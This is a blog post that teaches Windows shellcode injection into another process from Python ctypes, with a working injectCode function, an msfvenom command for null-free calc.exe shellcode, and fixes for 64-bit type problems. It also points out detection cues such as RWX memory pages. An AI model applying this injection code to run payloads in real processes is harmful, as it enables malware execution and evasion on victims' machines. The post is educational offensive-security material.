---
layout: post
title: Basic windows shellcode injection with python
date: 2020-04-11 01:00 +0100
modified: 2021-05-09 16:00:00 +0100
description: Injecting shellcode in a 64 bit process with Python 3.x and common Windows APIs for code injection.
tag: 
  - windows
  - python
  - code injection
--- 

<figure>
<img src="https://raw.githubusercontent.com/mncmb/mncmb.github.io/_posts/Basic-windows-shellcode-injection-with-python/paul-earle-xJ2tjuUHD9M-unsplash.jpg">
<figcaption>image by paul earle</figcaption>
</figure>

## intro

This post is about calling Windows API functions from python and performing basic shellcode injection using VirtualAllocEx and CreateRemoteThread.

Turns out you can achieve the same in C/C++ with less code and issues because there are plenty of examples on how to do simple code injection with VirtualAllocEx and CreateRemoteThread out there. Some of the problems encountered have to do with how `ctypes`, the python library for foreign function calls, interacts with Windows DLLs, especially the types it uses by default, changes throughout the versions of `ctypes` and differences between 32 and 64 bit programs. 

Still, if you are not too familiar with the subject this can serve as an introduction into process injection, as well as gaining some familiarity with the Windows API. Also this post discusses some issue encountered with 64bit shellcode injection utilizing python ctypes and their workarounds/solutions.

Code can be found [here](https://github.com/mncmb/shellcode_runner/tree/master/pyci)

## Code injection basics
The basic pattern for code injection consists of four steps:
1. choosing a process to inject to
2. allocating memory in the process address space
3. writing (position independent) code into the allocated memory
4. executing the code

This holds true for code injection. Another very common basic technique is DLL injection, which is not part of this post and differs only in the execution step. In DLL injection, instead of writing code the name of a DLL is written to a newly allocated memory page. Afterwards the DLL is loaded into the address space by a function like LoadLibrary. Due to specific "event trigger" functions, that a typical windows DLL implements, code can be executed, when a DLL is attached to a process.

A more detailled overview of general process injection can be seen in the following figure. The shown steps are discussed below.

<figure>
<img src="https://raw.githubusercontent.com/mncmb/mncmb.github.io/_posts/Basic-windows-shellcode-injection-with-python/process_injection_overview.png" alt="four steps of process injection">
<figcaption>Process injection overview</figcaption>
</figure>

### choosing a process
In step __1.__ a suitable process is picked. The process needs to run in the same or a lower __integrity level__ as the process that performs the injection. The injecting process needs adequate permissions, in the form of its integrity level, to be able to touch and modify another process' address space. Because of this reason, you will not be able to inject into `lsass.exe` (which runs with system integrity) from a low priv shell, but won't have trouble with something like `notepad.exe`.

Additionally, the code performing the injection needs to acquire a handle to the process, since Windows deals with references to objects like files or processes through handles. If you see a windows data type with a preceding `h`, this denotes a handle to an object. Handles are essentially pointer abstractions that allow the operating system to change the referenced memory location without affecting the process.

### allocating memory
While you probably could write to some arbitrary section of a process as long as it has read-write-execute (RWX) permissions or you change the permissions to include WRITE via VirtualProtectEx, this would likely result in a crash of the process if it isn't halted (paused). 
So in order to perform code injection the general approach is to allocate a new memory page where the injected code will be written to (step __2.__).

### writing & executing the code
Writing code to a process is done via the `WriteProcessMemory` function, among other optionss. It allows to copy the contents of a buffer to the "remote" or "external" process. 

As for getting the instruction pointer directed at the injected code, this can be achieved with the `CreateRemoteThread` function.

## putting it all together
With added logging output, comments and basic error handling you get the following. If you can live without that, you are looking at 7 lines of code, including redefinitions necessary for ctypes & 64bit code.

```py
def injectCode(pid, shellcode):

    # obtain a handle to the process that gets injected into
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
    logging.info(f"The value of the process handle h_process: {hex(h_process)}")
    if not h_process:
        logging.error(f"Couldn't acquire handle for PID: {pid} ")
        sys.exit(1)

    # allocate memory
    # return type of ctypes function has to be redefined, so it returns 64 bit values
    kernel32.VirtualAllocEx.restype=c_void_p  # c_ulonglong
    arg_address = kernel32.VirtualAllocEx(h_process, 0, len(shellcode), VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)

    # print address of the newly allocated page
    logging.info(f"The start value of the newly allocated page arg_address: {hex(arg_address)}")

    # the argument types also have to be redefied, so that they can deal with the 64bit value arg_address 
    kernel32.WriteProcessMemory.argtypes = [c_void_p, c_void_p, c_void_p, c_size_t, c_size_t]
    kernel32.CreateRemoteThread.argtypes = [c_void_p, c_void_p, c_size_t, c_void_p, c_void_p, c_size_t, c_void_p]

    # write the shellcode to the new allocated memory
    written = 0
    kernel32.WriteProcessMemory(h_process, arg_address, shellcode, len(shellcode), written)

    # call CreateRemoteThread with the entry point set to the start of the written shellcode
    thread_id = c_ulong(0)
    if not kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, byref(thread_id)):
        logging.error("CreateRemoteThread failed.")
        sys.exit(1)
    logging.info(f"Code injection successfull - thread ID: {hex(thread_id.value)}")
```

## issue discussion
I have encountered different issues with ctypes during the implementation that will be discussed in the following section. As for the python version: Python 3.8 was used on Windows 10 1809, installed via chocolatey.

### Ctypes memcopy issues 

The first issue affected memcopying: 
```s
Traceback (most recent call last):
  File ".\code_injection.py", line 51, in <module>
    kernel32.WriteProcessMemory(h_process, arg_address, shellcode, len(shellcode), byref(written))
ctypes.ArgumentError: argument 3: <class 'ValueError'>: embedded null character
```
From a bit of digging into the issue it seems that the handling of byte copy behaviour in `ctypes` was changed around python version 3.6 and embedded null characters are no longer accepted. Even when specifying the size of the buffer this does not change. 

In order to avoid the issue, the shellcode should be encoded. The encoding will then try to eliminate bad bytes if possible.

msfvenom command to generate encoded shellcode:
```s
msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -b '\x00' -f python
```

### Ctypes page allocation issues
A crash was encountered after a successful injection. This is most likely caused by one of two things: 

1. the shellcode is not executable (highly unlikely in this case)
2. execution wasn't redirected to shellcode


Let's look into it by adding some debug output. Pausing the execution and printing relevant memory sections and pointer values is especially useful during this step. 

```s
print("arg_address ", hex(arg_address))
input("press enter to continue")
```

Executing the code with added debug output leads prints the following:
```s
C:\Users\IEUser\AppData\Local\Programs\Python\Python37\python.exe .\code_injection.py -p 308
<class 'bytes'>
h_process  0x1d8
press enter to continue
arg_address  -0x1bb90000
press enter to continue
```

The above output shows `arg_address` as a negative value. Since this is the location of an allocated memory page, a negative number looks wrong. This might either be the bug leading to the crash, or it is another issue that just affects how the starting address is displayed. 


When looking for the newly created page in memory, it can be quickly found by searching for pages with read/write/execute permissions or `ERW` with a debugger like x64dbg or something like Process Hacker. Since this permission is uncommon for normal operations you can spot a page pretty easy through this. Atleast as long as you are not altering the protection status for camouflage ([VirtualProtect function](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)).

<figure>
<img src="https://raw.githubusercontent.com/mncmb/mncmb.github.io/_posts/Basic-windows-shellcode-injection-with-python/finding_virtualallocex.png" alt="Inspecting the allocated page">
<figcaption>Inspecting the allocated page</figcaption>
</figure>


You can see the selected page in the above image and how it has the `ERW` permissions. This permission stands out among other pages because it is uncommon for processes to rewrite instructions on memory pages that get executed. Atleast for images in the form of compiled executables, the loader sets everything up in advance and a legitimate process generally has no `ERW` pages. Seeing `Execute`, `Read` and `Write` permissions together stands out. 

From the `memory map` we can gather that the allocation worked. The next step in verifying the correctness of the operations is transforming the address from signed to unsigned.

A simple way of converting from what seems to be a signed value is by adding 2^32 to it. If we do that for the printed value we get

```s
>>> hex(int(-0x1bb90000) + 2**32)
'0xe4470000'
```
Our memory map showed us that the newly allocated memory page starts at `0x 0253 E447 0000`, suggesting that it is cut off at the 32bit margin. 
__While looking into this issue I stumbled upon some comments suggesting an undocumented change in ctypes regarding bitness. In order to get a correct return value, the return type of the method has to be manually specified.__


### Modifying the return type to get a 64 bit address

Changing the return type is pretty simple but introduces new problems.
The type can be changed by specifiying the `restype` attribute of the method:
```py
kernel32.VirtualAllocEx.restype=c_void_p  # c_ulonglong
```
The return type could either be typed as a pointer `c_void_p` or an unsigned longlong `u_longlong`. Depending on the underlying hardware and os, these could differ.


Running the script now returns:
```s
PS C:\Users\IEUser\Desktop\documentation_procInj> C:\Users\IEUser\AppData\Local\Programs\Python\Python37\python.exe .\code_injection.py 8076
<class 'bytes'>
h_process  0x1d8
press enter to continue
arg_address  0x27703400000
press enter to continue
Traceback (most recent call last):
  File ".\code_injection.py", line 85, in <module>
    kernel32.WriteProcessMemory(h_process, arg_address, shellcode, len(shellcode), byref(written))
ctypes.ArgumentError: argument 2: <class 'OverflowError'>: int too long to convert
PS C:\Users\IEUser\Desktop\documentation_procInj>
```

So now the new memory value leads to a conflict with ctypes expecting 32bit addresses. This can be resolved by specifying the value of the parameter. Unfortunately this cannot be done for a single parameter and has to be performed for all of them. 

Also, the default parameter values cannot be extracted from the function object like it can be done with the `restype`, so multiple lookups and redefinitions are necessary.


## Modifying argument types

Common windows specific types can be imported via `ctypes`.
This can be done as such
```python
from ctypes.wintypes import HANDLE, LPCVOID, LPVOID, DWORD
SIZE_T = c_size_t
```
There are loads of unique Windows types available and in general it would be best to provide the right arguments to each function by looking it up and setting the argument types accordingly. Further information on this can be taken from the [ctypes](https://docs.python.org/3/library/ctypes.html) and [windows data types](https://docs.microsoft.com/en-us/windows/win32/winprog/windows-data-types) documentation.

`SIZE_T` is provided as `c_size_t` by the `ctypes` library.

Looking up the expected types led to the following declarations: 
```s
kernel32.WriteProcessMemory.argtypes = [HANDLE, LPVOID, LPVOID, c_size_t, POINTER(c_int)]
kernel32.CreateRemoteThread.argtypes = [HANDLE, LPVOID, SIZE_T, LPVOID, LPVOID, SIZE_T, LPVOID]
```

Alternatively, the types can be redefined more sloppy. Since most of them are simply pointers, `c_void_p` can be used. This reduces the amount of type lookups between Windows data types and the ctypes equivalent.
```s
kernel32.WriteProcessMemory.argtypes = [c_void_p, c_void_p, c_void_p, c_size_t, c_void_p]
kernel32.CreateRemoteThread.argtypes = [c_void_p, c_void_p, c_size_t, c_void_p, c_void_p, c_size_t, c_void_p]
```
`c_void_p` or `size_t` are pretty much all that is needed for most functions. 


----------
## Sources:
- https://www.andreafortuna.org/2018/08/06/code-injection-on-windows-using-python-a-simple-example/
- https://gist.github.com/fdiskyou/557bf139ceb5c1b95b9eb4cb5d9167d2
- https://docs.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control
